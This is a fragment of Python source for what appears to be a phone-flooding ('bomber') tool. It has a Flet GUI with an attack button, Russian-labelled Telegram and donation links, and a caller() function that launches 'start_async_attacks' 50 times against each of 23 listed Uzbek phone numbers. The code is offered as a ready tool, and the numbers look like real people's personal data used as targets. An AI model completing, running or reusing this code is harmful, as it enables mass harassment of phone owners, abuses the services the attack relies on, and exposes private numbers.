...
def main(page: Page):
    ...
    def ADD():
        ...
        page.add(
                ...
                attack_button,
                Text('\n', size=12),
                Row([IconButton(icon='telegram', icon_size=48, tooltip='Канал', url='www.google.com', icon_color=color),
                    IconButton(icon='telegram', icon_size=48, tooltip='Владелец', url='www.google.com', icon_color=color),
                    IconButton(icon='attach_money', icon_size=48, tooltip='Донат', url='www.google.com', icon_color=color),
...
def Start(web=True):
    if web:
        ...
        app(main)
async def caller():
    olo = ['998907932779', '998913590996', '998913454742', '998330601533', '998930627748', '998935714055', '998883728844', '998885450773', '998995190584', '998948108707', '998972167227', '998910520042', '998907966066', '998945785552', '998880503686', '998931190220', '998947273305', '998939630035', '998937100500', '998934653638', '998912815152', '998951895757', '998905986787']
    tasks = [start_async_attacks(nuuu, 50) for nuuu in olo]
